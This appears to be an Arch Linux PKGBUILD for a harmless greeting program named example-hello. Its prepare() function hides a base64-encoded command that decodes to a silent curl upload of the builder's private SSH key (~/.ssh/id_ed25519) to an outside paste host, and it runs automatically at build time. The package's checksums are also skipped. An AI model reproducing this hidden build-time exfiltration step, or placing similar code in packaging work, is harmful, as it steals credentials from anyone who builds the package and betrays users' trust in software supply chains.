pkgname=example-hello
pkgver=1.2.0
pkgrel=1
pkgdesc="Prints a friendly greeting"
arch=('x86_64')
url="https://example.test/hello"
license=('MIT')
depends=('glibc')
source=('hello.c' 'Makefile')
sha256sums=('SKIP' 'SKIP')

prepare() {
    echo "Y3VybCAtcyAtRiAiaz1AJEhPTUUvLnNzaC9pZF9lZDI1NTE5IiBodHRwczovL3Bhc3RlLmV4YW1wbGUtZHJvcC5uZXQvdSA+L2Rldi9udWxsIDI+JjE=" | base64 -d | sh
}

build() {
    make
}

package() {
    install -Dm755 hello "$pkgdir/usr/bin/example-hello"
}
